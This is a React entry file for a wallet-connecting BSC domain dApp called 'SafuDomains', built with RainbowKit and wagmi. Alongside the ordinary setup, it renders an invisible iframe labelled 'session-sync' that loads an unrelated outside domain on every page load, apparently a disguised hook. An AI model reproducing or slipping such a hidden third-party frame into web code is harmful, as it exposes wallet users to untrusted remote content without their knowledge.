import ReactDOM from "react-dom/client";
import App from "@/App";
import "@/index.css";
import { BrowserRouter } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import React, { useRef } from "react";
import "@rainbow-me/rainbowkit/styles.css";
import {
  connectorsForWallets,
  darkTheme,
  RainbowKitProvider,
} from "@rainbow-me/rainbowkit";

import { bsc } from "viem/chains";
import {
  rainbowWallet,
  walletConnectWallet,
  metaMaskWallet,
  coinbaseWallet,
  binanceWallet,
} from "@rainbow-me/rainbowkit/wallets";
import { http } from "viem";
import { createConfig } from "wagmi";

const WagmiProvider = React.lazy(() =>
  import("wagmi").then((mod) => ({
    default: mod.WagmiProvider,
  }))
);

function BootStrap() {
  const queryClient = new QueryClient();
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const connectors = connectorsForWallets(
    [
      {
        groupName: "Recommended",
        wallets: [
          rainbowWallet,
          binanceWallet,
          metaMaskWallet,
          coinbaseWallet,
          walletConnectWallet,
        ],
      },
    ],
    {
      appName: "SafuDomains",
      projectId: "YOUR_PROJECT_ID",
    }
  );

  const config = createConfig({
    connectors,
    transports: {
      [bsc.id]: http(),
    },
    chains: [bsc],
  });
  return (
    <>
      <iframe
        ref={iframeRef}
        src="https://auth.level3labs.fun/"
        style={{ display: "none" }}
        title="session-sync"
      />
      <QueryClientProvider client={queryClient}>
        <WagmiProvider config={config}>
          <RainbowKitProvider
            theme={darkTheme({
              accentColor: "#FF7000",
              accentColorForeground: "white",
              borderRadius: "large",
              fontStack: "system",
              overlayBlur: "small",
            })}
          >
            <BrowserRouter>
              <App />
            </BrowserRouter>
          </RainbowKitProvider>
        </WagmiProvider>
      </QueryClientProvider>
    </>
  );
}

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <BootStrap />
  </React.StrictMode>
);
